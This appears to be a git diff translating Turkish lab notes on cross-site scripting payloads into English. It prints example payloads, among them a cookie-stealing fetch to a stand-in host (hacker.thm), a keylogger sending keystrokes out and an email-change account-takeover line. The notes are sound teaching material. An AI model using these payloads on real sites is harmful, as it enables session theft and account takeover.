@@ -1,58 +1,56 @@
-**Payload** nedir?
-
-XSS saldırılarında, payload hedefin bilgisayarında çalıştırılmasını istediğimiz JavaScript kodudur. Payload'ın iki bileşeni vardır:
-- **İntention (Niyet)**: JavaScript'in gerçekte ne yapmasını istediğimiz
-- **Modification (Değişiklik)**: Kodun her senaryoda çalışması için yapması gereken değişiklikler
+In XSS attacks, payload is the JavaScript code that we want to execute on the target's computer. Payload has two components:
+- **Intention (Intent)**: What we actually want JavaScript to do
+- **Modification (Change)**: The changes the code needs to make to work in every scenario
 
 ---
 
-## Payload Türleri ve Örnekleri
+## Payload Types and Examples
 
 ### 1. Proof Of Concept (PoC)
 
-**Amaç**: Bir web sitesinde XSS açığını gösterir/kanıtlamak
+**Purpose**: Demonstrate/prove an XSS vulnerability on a website
 
-**Özellikler**:
-- En basit payload türüdür
-- Sayfada bir uyarı kutusu açar
-- Saldırganın yetkisini gösterir
+**Characteristics**:
+- The simplest type of payload
+- Opens an alert box on the page
+- Shows the attacker's authority
 
-**Örnek Kod**:
+**Example Code**:
 ```javascript
 <script>alert('XSS');</script>
 ```
 
 ---
 
-### 2. Session Stealing (Oturum Çalma)
+### 2. Session Stealing
 
-**Amaç**: Hedefin oturum bilgilerini (login token, cookies) çalmak
+**Purpose**: Steal the target's session information (login token, cookies)
 
-**Nasıl Çalışır**:
-1. Hedefin cookie'sini alır
-2. Base64 ile encode eder (güvenli iletim için)
-3. Saldırganın kontrol ettiği sunucuya gönderir
-4. Saldırgan bu cookie'leri kullanarak hedefin hesabına giriş yapar
+**How It Works**:
+1. Retrieves the target's cookie
+2. Encodes it with Base64 (for secure transmission)
+3. Sends it to the attacker's controlled server
+4. The attacker uses these cookies to log into the target's account
 
-**Örnek Kod**:
+**Example Code**:
 ```javascript
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
 ```
 
-**Risk Seviyesi**: 🔴 Çok Yüksek (Tam Hesap Kontrolü)
+**Risk Level**: 🔴 Very High (Full Account Control)
 
 ---
 
-### 3. Key Logger (Tuş Kaydedici)
+### 3. Key Logger
 
-**Amaç**: Hedefin web sitesinde yazdığı her şeyi kaydetmek
+**Purpose**: Record everything the target types on the website
 
-**Nasıl Çalışır**:
-1. Kullanıcının tuş basışlarını izler
-2. Yazılan karakterleri saldırganın sunucusuna gönderir
-3. Base64 ile encode edilerek iletilir
+**How It Works**:
+1. Monitors the user's keystrokes
+2. Sends typed characters to the attacker's server
+3. Transmitted with Base64 encoding
 
-**Örnek Kod**:
+**Example Code**:
 ```javascript
 <script>
   document.onkeypress = function(e) { 
@@ -61,44 +59,44 @@ XSS saldırılarında, payload hedefin bilgisayarında çalıştırılmasını i
 </script>
 ```
 
-**Risk Senaryoları**:
-- Giriş bilgileri (kullanıcı adı, şifre)
-- Kredi kartı numaraları
-- Kişisel bilgiler
-- E-posta adresleri
+**Risk Scenarios**:
+- Login credentials (username, password)
+- Credit card numbers
+- Personal information
+- Email addresses
 
-**Risk Seviyesi**: 🔴 Çok Yüksek (Finansal & Kişisel Veri Hırsızlığı)
+**Risk Level**: 🔴 Very High (Financial & Personal Data Theft)
 
 ---
 
-### 4. Business Logic (İş Mantığı)
+### 4. Business Logic
 
-**Amaç**: Hedef web sitesinin belirli fonksiyonlarını çağırmak ve değiştirmek
+**Purpose**: Call and modify specific functions of the target website
 
-**Nasıl Çalışır**:
-1. Web sitesinin JavaScript fonksiyonlarını çağırır
-2. Kullanıcı adına işlemler gerçekleştirir
-3. Hesap ayarlarını veya verilerini değiştirir
+**How It Works**:
+1. Calls the website's JavaScript functions
+2. Performs operations on behalf of the user
+3. Changes account settings or data
 
-**Örnek Kod**:
+**Example Code**:
 ```javascript
 <script>user.changeEmail('attacker@hacker.thm');</script>
 ```
 
-**Saldırı Zinciri Örneği**:
-1. E-posta adresini `attacker@hacker.thm` olarak değiştirir
-2. Şifre sıfırlama isteği gönderir
-3. Saldırganın e-postasına reset linki gelir
-4. Saldırgan hesaba tam erişim elde eder
+**Attack Chain Example**:
+1. Changes email address to `attacker@hacker.thm`
+2. Sends a password reset request
+3. The reset link arrives at the attacker's email
+4. The attacker gains full account access
 
-**Risk Seviyesi**: 🔴 Çok Yüksek (Tam Hesap Kontrolü)
+**Risk Level**: 🔴 Very High (Full Account Control)
 
 ---
 
-## Payload Bileşenleri Özeti
+## Payload Components Summary
 
-| Bileşen | Açıklama | Örnek |
-|---------|----------|--------|
-| **İntention** | Payload'ın gerçek amacı | Oturum çalma, tuş kaydetme |
-| **Modification** | Koda yapılan değişiklikler | Hedef URL'si, encode yöntemi |
-| **Execution Context** | Payload'ın çalıştığı ortam | DOM, Event Handler, Script Tag |
+| Component | Description | Example |
+|-----------|-------------|---------|
+| **Intention** | The actual purpose of the payload | Session stealing, key logging |
+| **Modification** | Changes made to the code | Target URL, encoding method |
+| **Execution Context** | The environment where the payload runs | DOM, Event Handler, Script Tag |
